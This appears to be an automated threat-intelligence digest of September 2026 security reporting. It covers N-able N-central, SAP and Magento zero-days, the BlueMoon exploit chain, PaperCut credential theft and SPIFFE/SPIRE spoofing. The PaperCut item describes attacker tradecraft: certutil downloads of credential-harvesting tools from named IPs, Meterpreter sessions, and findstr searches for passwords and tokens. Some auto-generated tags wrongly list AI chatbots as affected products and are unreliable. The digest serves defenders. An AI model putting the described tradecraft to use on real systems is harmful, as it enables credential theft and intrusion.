- Title: Critical N-able N-central Vulnerability and Active Exploitation
- Source: Huntress (detection_response_operations)
- Published: 2026-09-06T11:00:00+00:00
- Link: https://www.huntress.com/blog/n-able-vulnerability-exploitation
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- cve_ids: CVE-2026-86218, CVE-2026-86206, CVE-2026-86207
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
UPDATE: Critical vulnerability in N-able N-central gives attackers unauthenticated, "god-mode" access to the RMM console.
```

#### Full body

```
Home Blog Rapid Response: Critical N-able N-central Vulnerability and Active Exploitation Last Updated: September 6, 2026 Rapid Response: Critical N-able N-central Vulnerability and Active Exploitation By: Ben Bernstein John Hammond Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways UPDATE 9/6/26: N-able issued [ Hotfix 4 (2026.3 HF4) ] to address CVE-2026-86218 , an actively exploited pre-auth RCE zero-day with a 10.0 CVSS score that supersedes all prior hotfixes. On-premises N-central users must apply HF4 immediately, as systems running HF3 remain vulnerable to this newly disclosed flaw. Hosted (NCOD) instances have already been patched by N-able. UPDATE 9/5/26: Huntress has produced a proof of concept (PoC) exploit of a net new vulnerability chain ( CVE-2026-86206 and CVE-2026-86207 ) in N-central. This is distinct from the August flaws and would allow attackers to bypass access controls to create unauthorized administrative accounts. N-able has released a new security advisory and hotfix ( 2026.3.1.13) ; all N-Central customers must plan to apply this new patch immediately , audit user lists for anomalous account creation (such as .invalid emails), and strictly limit inbound network access to the console. In August 2026, N-able disclosed a critical vulnerability impacting all current versions of N-central, including 2026.3 , across both hosted and on‑prem deployments. The flaw can give attackers unauthenticated, "god-mode" access to the RMM console. On August 2, a hotfix was released, followed by a second hotfix on August 6, and N-able is recommending all customers upgrade to the hotfix version (2026.3.1.10) immediately. Exploitation is active in the wild; a compromised N-central server can be used to run scripts, push tools, and open remote sessions across every downstream endpoint it manages. As of publication, Huntress has seen exploitation impacting one organization in our customer base; we are continually hunting N-central–related activity in our telemetry and reviewing logs that align with N‑able's described tradecraft. MSPs using N-central should apply N-able's 2026.3.1.10 hotfix, which you can find more information about here (along with documentation and release notes ). Potentially impacted organizations should also lock down access to N-central, review N-central activity for suspicious logins and remote-control sessions, and (for Huntress customers) ensure Managed Response isolation and remediation are enabled wherever possible. Because this vulnerability bypasses normal authentication, if your N-central server is still broadly reachable from the internet or other untrusted networks, you should consider temporarily disabling N-central—up to and including taking the server offline—until N-able's hotfix is applied and you can bring it back up behind strict network controls. Acknowledgments : Special thanks to Aaron Deal, Chris Bisnett, Aaron Bennett, Sharon Martin, Dave Kleinatland, James Northey, Josh Kiriakoff, Kamal Bennoune, Susannah Matt, and Michael Tigges for their contributions to this investigation and write-up. Update: 9/6/26 @ 7:30 AM ET In the early morning hours (U.S. time) of 9/6/2026, Huntress was alerted to a new CVE ( CVE-2026-86218 ) and fourth hotfix via a Discord post on MSPGeek. Notably, this third CVE is an N-central pre-auth remote code execution vulnerability rated with a 10.0 CVSS score, which is the maximum allowable rating and higher than the previous two CVEs published on 9/5. N-able also said that this release supersedes N-central 2026.3 Hotfix 3 (build 2026.3.1.13). Here's the full notes from Jason Murphy with N-able in that MSPGeek Discord thread: We recently communicated about two security vulnerabilities within N-central that were responsibly disclosed by a third party through our voluntary security disclosure program and we issued a hotfix. Since the disclosures, a third, independent researcher alerted us to a new vulnerability that has been exploited in
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Critical N-able N-central Vulnerability and Active Exploitation
  - Published: 2026-09-06T11:00:00+00:00
  - Link: https://www.huntress.com/blog/n-able-vulnerability-exploitation
  - Summary: UPDATE: Critical vulnerability in N-able N-central gives attackers unauthenticated, "god-mode" access to the RMM console.

### Cluster 9097ac899e — score 15

- Title: Microsoft discloses two actively exploited zero-days among 974 vulnerabilities
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-09-08T22:50:41+00:00
- Link: https://cyberscoop.com/microsoft-patch-tuesday-september-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, vulnerability_disclosure, zero_day
- affected_industries: financial_services, government, telecommunications
- cve_ids: CVE-2026-81963, CVE-2026-85880
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, vulnerability_disclosure, active_exploitation
- affected_industries: financial_services, government, telecommunications
- cve_ids: CVE-2026-81963, CVE-2026-85880
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
While the vendor hit another monthly record, it hasn’t resulted in a flood of active exploits. Researchers encourage customers to focus on their specific areas of risk and exposure. The post Microsoft discloses two actively exploited zero-days among 974 vulnerabilities appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Microsoft addressed 974 defects across its product suite, including two actively exploited zero-day vulnerabilities, in its monthly Patch Tuesday security program . The massive batch of patches, Microsoft’s largest ever, reflects a continuing trend for the vendor as it leans on artificial intelligence to discover more vulnerabilities at a faster rate. Yet, the recent period of record breaking vulnerability disclosures hasn’t resulted in a flood of actively exploited zero-days. “AI-assisted vulnerability discovery shows no signs of slowing down,” Dustin Childs, head of threat awareness at Trend Micro’s Zero Day Initiative, wrote in a blog post Tuesday. “However, we have not seen a correlating spike in active exploits — yet.” The vulnerabilities actively exploited prior to disclosure — CVE-2026-81963 affecting the Windows Update Stack and CVE-2026-85880 affecting Windows Advanced Local Procedure Call — both have CVSS ratings of 7.8 and allow attackers to escalate privileges. Advertisement More than 1 in 10 defects Microsoft disclosed in this month’s security update are rated critical. The update included 723 vulnerabilities in Windows, 111 in Office, 111 in Office 2016, 62 in SQL and 22 spanning various developer tools. Researchers encouraged security teams and customers to not get overwhelmed by the total number of defects, but instead focus on their specific areas of risk and exposure. “While the number of vulnerabilities being patched is rising, the number of vulnerabilities that can and will affect most organizations remains quite low. AI-assisted vulnerability discovery in 2026 is creating larger haystacks, but it isn’t finding more needles,” Satnam Narang, senior staff research engineer at Tenable, said in an email. “It’s critical that organizations understand which vulnerabilities actually apply to them, whether they pose a threat by being reachable and exploitable, and prioritize remediation based on this risk context,” he added. Jack Bicer, director of vulnerability research at Action1, drew a similar conclusion from the record-breaking Patch Tuesday. Advertisement “At this scale, the challenge is not simply getting through the patch list but knowing what needs attention first,” he said. “With hundreds of updates landing at once, IT and security teams need to quickly separate the vulnerabilities that demand immediate action from those that can follow the normal deployment cycle.” The full list of vulnerabilities addressed this month is available in Microsoft’s Security Response Center . Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops (Getty Images) Binary code depicted in waves. (iStock/Getty Images) (Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity AI-adaptable security platforms are critical for autonomous decision-making Defending in the middle of the vulnpocalypse The Vulnpocalypse arrived early Government FBI officials say AI is bolstering adversaries, emphasizing need to focus on cyber basics, patching Feds accuse China of ‘systematic’ distillation of U.S. AI models CIA’s Michael Ellis says cyber intelligence is changing how the agency operates The G7 tells industry to hurry up and prep for post-quantum encryption Technology European parliament members call for slowdown of Serbia’s EU entry over spyware use FCC proposes public scorecard to rate telecoms on anti-robocall efforts Pegasus, NoviSpy variant spyware found on devices of Serbian activists Wyden seeks upgraded NSA security guidance on commercial VPN use Threats Russian national extradited to US for alleged involvement in bank-account takeover scheme Jail time for Maine child in 764 marks turning point in federal law enforcement Dogged Russia-based botnet dismantled after 23-year run FBI raises alarm over deceptive phishing campaign targeting prominent peop
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Microsoft discloses two actively exploited zero-days among 974 vulnerabilities
  - Published: 2026-09-08T22:50:41+00:00
  - Link: https://cyberscoop.com/microsoft-patch-tuesday-september-2026/
  - Summary: While the vendor hit another monthly record, it hasn’t resulted in a flood of active exploits. Researchers encourage customers to focus on their specific areas of risk and exposure. The post Microsoft discloses two actively exploited zero-days among 974 vulnerabilities appeared first on CyberScoop .

### Cluster a56221f5e5 — score 15

- Title: SAP Patches CVSS 10.0 Kernel Flaw Enabling Unauthenticated Remote Code Execution
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T06:25:45+00:00
- Link: https://thehackernews.com/2026/09/sap-patches-cvss-100-kernel-flaw.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-44756

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-44756, CVE-2026-58240, CVE-2026-66768, CVE-2026-76969
- urgency_signals: critical_cvss, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-44756, CVE-2026-58240, CVE-2026-76969, CVE-2026-66768
- urgency_signals: preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
SAP has released security updates to address multiple vulnerabilities, including a maximum-severity flaw in SAP Extended Passport (EPP) Processing that could have a severe impact on the confidentiality, integrity, and availability of the application The vulnerability, tracked as CVE-2026-44756 (CVSS score: 10.0), has been described as a case of memory corruption. Discovered and reported by SAP
```

#### Full body

```
SAP Patches CVSS 10.0 Kernel Flaw Enabling Unauthenticated Remote Code Execution  Ravie Lakshmanan  Sep 09, 2026 Vulnerability / Enterprise Security SAP has released security updates to address multiple vulnerabilities, including a maximum-severity flaw in SAP Extended Passport (EPP) Processing that could have a severe impact on the confidentiality, integrity, and availability of the application The vulnerability, tracked as CVE-2026-44756 (CVSS score: 10.0), has been described as a case of memory corruption. Discovered and reported by SAP security company Onapsis, it has been codenamed OVERPASS . The flaw, which resides in the SAP kernel's processing of the Extended Passport (EPP), is exploitable remotely and without authentication, and allows bad actors to run arbitrary operating system commands on the SAP host with SAP administrative privileges, leading to a total compromise of the underlying SAP business data and processes. CVE-2026-44756 stems from a missing boundary validation during the deserialization of EPP data, leading to a memory safety violation when processing externally supplied length fields. An unauthenticated attacker can exploit this loophole to send crafted network requests containing a malformed EPP header and trigger unintended behavior and abnormal program termination. "OVERPASS is a flaw in the SAP kernel code that processes this structure. A specially-crafted request sent to an affected system can be abused to take control of the receiving process and, from there, run operating system commands on the host," Onapsis CTO JP Perez-Etchegoyen said. "Because EPP processing is shared kernel code used by more than one protocol, the flaw is reachable from the internet-facing web layer, from the SAP GUI layer every end user connects to, and from the RFC layer that links SAP systems to one another. It is reachable through several SAP components and several communication protocols, none of them requiring credentials, so no single network control can fully mitigate risk." Successful exploitation can permit an attacker to read the SAP secure store to recover database credentials, password hashes and all housed business data; read the live session data of logged-in users; extract stored credentials to move laterally into every other SAP system; and modify application data, system configuration and the SAP binaries. The second critical flaw patched by SAP is CVE-2026-58240 (CVSS score: 9.8), a missing Authentication check in SAP NetWeaver Message Server that unauthenticated attackers with network access can exploit to perform unauthorized actions. Onapsis, which also discovered the vulnerability, has assigned it the name S4GET. "S4GET is a logic flaw, not a misconfiguration," security researcher Pablo 'Partu' Agustin Artuso said . "It is present in SAP's 9.x kernel lines – the kernels that SAP S/4HANA and SAP S/4HANA Cloud Private Edition run on, and potentially other ABAP-based products as well." "What makes it uniquely dangerous is its reachability: the flaw is triggered through the same public port that every SAP GUI client connects to, so it cannot be firewalled away without breaking the end-user logon. Exploitation requires no credentials, no certificate, and no pre-existing misconfiguration. A successful attack yields full remote code execution as <sid>adm, the OS-level user that runs SAP, on every application server in the cluster." Two other critical-rated security flaws patched by SAP are as follows - CVE-2026-76969 (CVSS score: 9.4) - A credential disclosure vulnerability in multi-tenant applications using SAP Cloud Application Programming Model (CAP) that allows an unauthenticated attacker to obtain sensitive credentials by sending specially crafted requests, and then use them to replace or delete tenant data. CVE-2026-66768 (CVSS score: 9.0) - An improper access control vulnerability in SAP NetWeaver SAP GUI for Java that allows execution of arbitrary commands on the underlying host. Although none of th
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: SAP Patches CVSS 10.0 Kernel Flaw Enabling Unauthenticated Remote Code Execution
  - Published: 2026-09-09T06:25:45+00:00
  - Link: https://thehackernews.com/2026/09/sap-patches-cvss-100-kernel-flaw.html
  - Summary: SAP has released security updates to address multiple vulnerabilities, including a maximum-severity flaw in SAP Extended Passport (EPP) Processing that could have a severe impact on the confidentiality, integrity, and availability of the application The vulnerability, tracked as CVE-2026-44756 (CVSS score: 10.0), has been described as a case of memory corruption. Discovered and reported by SAP

### Cluster 62136c6613 — score 14

- Title: Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T16:34:05+00:00
- Link: https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: APT31

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, phishing_social_eng
- actor_attribution: APT31
- affected_industries: government
- cve_ids: CVE-2026-85046, CVE-2026-85880, CVE-2026-87491
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage, active_exploitation
- actor_attribution: APT31
- affected_industries: government
- cve_ids: CVE-2026-85046, CVE-2026-87491, CVE-2026-85880
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Multiple espionage-motivated threat activity clusters have been found deploying a previously undocumented exploit kit called BlueMoon that chains together multiple vulnerabilities in Microsoft Windows and Google Chrome. The first in-the-wild use of BlueMoon has been attributed to the China-aligned state-sponsored group tracked as APT31 (aka Bronze Vinewood, Judgement Panda, JungleBamboo,
```

#### Full body

```
Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week  Ravie Lakshmanan  Sep 09, 2026 Vulnerability / Cyber Espionage Multiple espionage-motivated threat activity clusters have been found deploying a previously undocumented exploit kit called BlueMoon that chains together multiple vulnerabilities in Microsoft Windows and Google Chrome. The first in-the-wild use of BlueMoon has been attributed to the China-aligned state-sponsored group tracked as APT31 (aka Bronze Vinewood, Judgement Panda, JungleBamboo, PerplexedGoblin, RedBravo, TA412, Tide Castle, and Violet Typhoon) on August 28, 2026. "Within days, several other espionage-motivated clusters began using BlueMoon, the majority of which have a suspected China nexus," Proofpoint said in a report published today. "However, BlueMoon may not be exclusive to China-aligned actors, as some usage remains unattributed and there are also potentially more actors using the exploit kit." The exploit chain employs three vulnerabilities - CVE-2026-85046 , a type confusion in V8 in Google Chrome CVE-2026-87491 , an out-of-bounds bug in V8 in Google Chrome that can lead to a sandbox escape CVE-2026-85880 , a heap-based buffer overflow vulnerability in Windows Advanced Local Procedure Call (ALPC) While CVE-2026-85046 was patched by Google last week, CVE-2026-85880 was addressed by Microsoft as part of its September 2026 Patch Tuesday updates. Proofpoint told The Hacker News that Google, despite currently not issuing CVEs for V8 sandbox escapes, has assigned one for this specific flaw under CVE-2026-87491. A patch for the security defect was released by Google on September 8, 2026. Interestingly, both V8 vulnerabilities in Chrome are said to have been "patch-gap" zero-days at the time they were maliciously exploited. The enterprise security company said the flaws had already been fixed in public upstream Chromium source code, but were yet to be propagated to the latest stable releases of Chrome and Chromium-based browsers available. It's suspected that the developer behind the exploit kit may have been closely keeping track of publicly available Chromium patches to put together the browser exploit chain. Attack chains making use of BlueMoon have been found to rely on phishing emails as a starting point to trick targets into visiting an actor-controlled URL that triggers the two V8 flaws in succession to achieve code execution and escape the browser sandbox, and then exploit the Windows local privilege escalation bug to inject shellcode that downloads multiple payloads depending on the threat cluster behind it. "Following the Chrome exploits, the kit uses a reflectively loaded DLL to fingerprint the Windows host, which the exploit kit JavaScript uses to decide whether to attempt the LPE exploit," Proofpoint researchers Mark Kelly, Greg Lesnewich, Konstantin Klinger, Saher Naumaan, Julia Paluch, David Galazin, and Stuart Del Caliz said. "A second reflectively loaded DLL runs the LPE exploit to elevate the renderer process. With those additional privileges, a separate injector shellcode injects a CreateProcess stub into the parent Chrome broker process, executing an operator-specified command. The default command downloads a remotely hosted executable via a curl command and executes it." Multiple variants of the exploit kit have been detected with subtle changes that removed comments or obfuscated its components, while others incorporate campaign-specific landing pages and redirects, browser-side operating system checks, or additional telemetry. Despite these modifications, the underlying exploit chain remains the same. A brief description of the observed attack chains is as follows - APT31 (Beginning on August 28, 2026), which used spear-phishing lures to target non-governmental organizations (NGOs), mining companies, and physical commodity trading firms in the U.S. to trick victims into clicking on a malicious link that serves BlueMoon, which then downloads and runs a load
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Four Spy Groups Used the Same Chrome and Windows Exploit Kit Within a Week
  - Published: 2026-09-09T16:34:05+00:00
  - Link: https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html
  - Summary: Multiple espionage-motivated threat activity clusters have been found deploying a previously undocumented exploit kit called BlueMoon that chains together multiple vulnerabilities in Microsoft Windows and Google Chrome. The first in-the-wild use of BlueMoon has been attributed to the China-aligned state-sponsored group tracked as APT31 (aka Bronze Vinewood, Judgement Panda, JungleBamboo,

### Cluster bda50a6645 — score 14

- Title: Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-05T20:14:47+00:00
- Link: https://thehackernews.com/2026/09/unpatched-magento-and-adobe-commerce.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor, zero_day
- affected_industries: retail_ecommerce
- urgency_signals: no_patch_yet, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor
- affected_industries: retail_ecommerce
- urgency_signals: zero_day, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Attackers are exploiting a new unpatched vulnerability in Magento Open Source and Adobe Commerce that lets them run malicious code on an online store's server without logging in, Dutch e-commerce security company Sansec said in an advisory published on September 5. Sansec, which discovered the flaw and named it StyleSmuggler, said attacks started on September 4. "Sansec is
```

#### Full body

```
Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores  Swati Khandelwal  Sep 05, 2026 Zero Day / Vulnerability Attackers are exploiting a new unpatched vulnerability in Magento Open Source and Adobe Commerce that lets them run malicious code on an online store's server without logging in, Dutch e-commerce security company Sansec said in an advisory published on September 5 . Sansec, which discovered the flaw and named it StyleSmuggler , said attacks started on September 4. "Sansec is publishing early because stores are being compromised right now," the company said. As of September 6, Adobe has not published an advisory, a CVE identifier, a patch, or a workaround, and its Adobe Commerce security bulletin index lists nothing after the August 11 update. A successful attack gives the attacker code execution on the store's server and installs a persistent backdoor. Sansec said all current versions are affected, including 2.4.9, and that it reproduced the full unauthenticated chain on clean Magento Open Source installations of 2.4.7, 2.4.8, and 2.4.9. Its first victim ran 2.4.6-p15 with Adobe's July and August 2026 security updates applied, which is the latest patch level Adobe offers for that release line and one that Adobe's August bulletin labels 2.4.6-2026-aug. Sansec has not published a reproduction on Adobe Commerce or on Adobe Commerce on Cloud, and Adobe has not confirmed which versions are affected. Sansec has not said how many stores have been compromised. The researchers' interim advice for stores not running its Shield product is to temporarily disable GraphQL until Adobe releases a fix. Disrex Group , a Magento hosting and development company that hosts and responded to two of the compromised stores, notes that headless and progressive web app storefronts require GraphQL, whereas most classic and Hyvä storefronts do not. Adobe's next scheduled security release is on September 8, Sansec said, and it is not yet known whether that release will cover this bug. Disrex's findings are independent evidence of exploitation from outside Sansec. In an incident-response repository published on September 5, the company said it handled two compromised stores and a third that was attacked but not breached, and that its web-server rules are based on attack traffic captured on one of the compromised stores. In answers to questions from The Hacker News, Disrex said both stores ran Magento Open Source rather than Adobe Commerce, and that it hosts them itself through its hosting brand RexHosting. The store Disrex labels Store A ran Magento Open Source 2.4.8 and was a Sansec Shield customer, with the module installed, enabled, and licensed. It was hit at 23:10 UTC on September 4, hours before Sansec's first blocking rules for this flaw went live, and Disrex said Shield was active and blocking other malicious traffic against the store at the time. Store B , which was not a Shield customer, ran Magento 2.4.7-p2, a security patch level that Adobe's version history dates to August 2024, eight levels behind the current 2.4.7-p10. It was first hit at 00:55 UTC on September 5, Disrex said, and it is the store from which the company's web-server rules and its reading of the vulnerable code were taken. Both stores were breached inside the roughly eight-hour window between the first exploitation Sansec observed and the moment any defence for it existed, Disrex said. "Patch status was irrelevant here, which is the part merchants most need to hear," the company told The Hacker News. The repository carries its own warning. "This repository was written with AI assistance, during a live incident, in a few hours," its README says, adding that it has not been reviewed, that its Apache rules were never run against a live Apache server, and that most of its cleanup commands were written rather than executed. Sansec's indicators describe the implant as a background process disguised under [kworker/u:8:0] , a name that belongs to
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores
  - Published: 2026-09-05T20:14:47+00:00
  - Link: https://thehackernews.com/2026/09/unpatched-magento-and-adobe-commerce.html
  - Summary: Attackers are exploiting a new unpatched vulnerability in Magento Open Source and Adobe Commerce that lets them run malicious code on an online store's server without logging in, Dutch e-commerce security company Sansec said in an advisory published on September 5. Sansec, which discovered the flaw and named it StyleSmuggler, said attacks started on September 4. "Sansec is

### Cluster d67c59e989 — score 13

- Title: Attackers Exploit PaperCut Flaws to Steal Credentials From Schools and Universities
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-05T07:31:53+00:00
- Link: https://thehackernews.com/2026/09/attackers-exploit-papercut-flaws-to.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-81578, CVE-2026-82078

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft, phishing_social_eng, supply_chain, web_shell_backdoor, zero_day
- affected_industries: education
- affected_products: AWS, OpenAI/ChatGPT, VMware
- cve_ids: CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, phishing_social_eng, credential_theft, zero_day, web_shell_backdoor, active_exploitation
- affected_industries: education
- affected_products: AWS, VMware, OpenAI/ChatGPT
- cve_ids: CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, zero_day, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors are exploiting the newly disclosed PaperCut flaws to facilitate credential theft in attacks targeting the education sector in the U.S. and Europe. The Arctic Wolf Adversary Research Team said it observed attackers exploiting CVE-2026-81578 and CVE-2026-82078 – an authentication bypass and remote code execution chain – to conduct command execution and reconnaissance, as well as
```

#### Full body

```
Attackers Exploit PaperCut Flaws to Steal Credentials From Schools and Universities  Ravie Lakshmanan  Sep 05, 2026 Vulnerability / Web Security Threat actors are exploiting the newly disclosed PaperCut flaws to facilitate credential theft in attacks targeting the education sector in the U.S. and Europe. The Arctic Wolf Adversary Research Team said it observed attackers exploiting CVE-2026-81578 and CVE-2026-82078 – an authentication bypass and remote code execution chain – to conduct command execution and reconnaissance, as well as create privileged accounts. "Observed post-exploitation activity included delivery of Windows registry hive collection tools, Metasploit/Meterpreter-related Java payloads, and commands used to identify hosts, users, processes, and sensitive configuration data," Arctic Wolf said. The cybersecurity company told The Hacker News that the activity has targeted vulnerable PaperCut servers across the education sector, impacting organizations ranging from K-12 schools to major universities in the U.S. and Europe. Some of the identified malicious activity includes - Running discovery commands like uname, whoami, ver, and tasklist, and privileged account creation ("Administrator17") Inbound GET requests from "45.142.193[.]132" that request for "/custom/pcp_*.txt" and "/custom/web/pcp_*.txt" files on compromised hosts, containing harvested system and user data Deliver credential-harvesting tools like lsa_collect.exe, lsa_collect_small.exe, and save_hives.exe via "certutil.exe" from "45.142.193[.]132" Retrieve Meterpreter Java payloads from, and establish sessions to, "194.180.48[.]134" Use "findstr" to search PaperCut *.config files for the terms "password," "secret," "ldap," "bind,v and "token" Arctic Wolf said it also detected "lsa_collect.exe" in a sandbox that extracted specific registry keys to reconstruct the system BootKey, which can then grant the attacker access to the SAM database. "The concern is that those stolen logins could give attackers a pathway into other critical systems across the environment. Post-compromise activity included deployment of Windows registry," Arctic Wolf said in a statement. Users are advised to restrict PaperCut servers from being exposed to the internet and monitor for the execution of cmd.exe, powershell.exe, or other scripting and command interpreters, along with commands containing whoami, tasklist, ver, or uname -a with pc-app.exe as the parent process. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Credential Theft , Malware , Vulnerability , Web Security ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw Attackers Hijack MikroTik Routers Through Internet-Exposed SSH Without Authentication Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials Critical VMware Workstation and Fusion Flaw Lets VM Admins Execute Host Code Thousands of OpenAI Agents Quietly Turned an Abandoned Wiki Into Their Coordination Channel Attackers Exploit PaperCut Flaws to Steal Credentials From Schools and Universities Phishing Campaign Sends Millions of Emails Using Invisible Unicode to Evade Filters PostgreSQL Fixes 12-Year-Old Logical Decoding Flaw Enabling Replication-Role Code Execution New Ted Backdoor Hides Inside Victims' Own HAProxy Builds to Intercept Web Traffic Google Releases Chrome Update to Patch Actively Exploited V8 Zero-Day ThreatsDay: CEO Phishing Kits, 5K Dropbox Account Hacks, OAuth Traps + 17 More Stories Critical Cisco Nexus
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Attackers Exploit PaperCut Flaws to Steal Credentials From Schools and Universities
  - Published: 2026-09-05T07:31:53+00:00
  - Link: https://thehackernews.com/2026/09/attackers-exploit-papercut-flaws-to.html
  - Summary: Threat actors are exploiting the newly disclosed PaperCut flaws to facilitate credential theft in attacks targeting the education sector in the U.S. and Europe. The Arctic Wolf Adversary Research Team said it observed attackers exploiting CVE-2026-81578 and CVE-2026-82078 – an authentication bypass and remote code execution chain – to conduct command execution and reconnaissance, as well as

### Cluster 35d2f86bf7 — score 12

- Title: The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-10T10:00:43+00:00
- Link: https://unit42.paloaltonetworks.com/kubernetes-spiffe-spire-identity-spoofing/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Kubernetes

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Kubernetes
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Kubernetes
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Learn how root access on a compromised K8s node allows attackers to utilize SPIFFE/SPIRE metadata to spoof and harvest co-located workload identities. The post The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE 11 min read Related Products Cortex Cortex Cloud Cortex XDR Cortex XSIAM Unit 42 Incident Response By: Eviatar Garzi Published: September 10, 2026 Categories: Malware Threat Research Tags: API Cryptographic JSON Linux Node SPIFFE SPIRE Spoofing Share Executive Summary This research demonstrates post-exploitation techniques that could allow an attacker with root access on a compromised Kubernetes node to misuse an open standard and reference implementation for machine identity known as SPIFFE/SPIRE to impersonate co-located workloads and harvest SPIFFE Verifiable Identity Documents (SVIDs). We show how the trust assumption at the core of every machine-identity system — that the node is trusted — collapses once an attacker obtains root on that node. Unit 42 has not observed this technique exploited in the wild. The Secure Production Identity Framework for Everyone (SPIFFE)/the SPIFFE Runtime Environment (SPIRE) is widely deployed in Kubernetes and cloud-native environments to replace long-lived secrets with short-lived, cryptographically verifiable workload identities. Our research shows how an attacker with root can spoof the Linux control group (cgroup) information the SPIRE agent uses during workload attestation. This tricks the agent into issuing a co-located workload's SVID to an attacker-controlled process. As part of this research, we developed Spooffe , an open-source tool that defenders can use to test whether an attacker with administrative access could manipulate cgroup metadata to retrieve co-located workload identities and assess the resulting identity area of impact. When designing threat models for SPIFFE/SPIRE, organizations should assume that root-level access to a node grants access to all cryptographic identities scoped to it. We recommend performing the following activities to reduce exposure: Harden nodes Restrict root access Prohibit privileged containers, host access Minimize reliance on weak selectors Palo Alto Networks customers are better protected from the threats described here through the following products and services: Cortex XDR and XSIAM Cortex Cloud Identity Threat Detection If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Identity , Cloud , Kubernetes Introduction SPIFFE is an open standard for machine identity designed to solve the “Secret Zero” problem — the challenge of securely introducing the initial secret required to 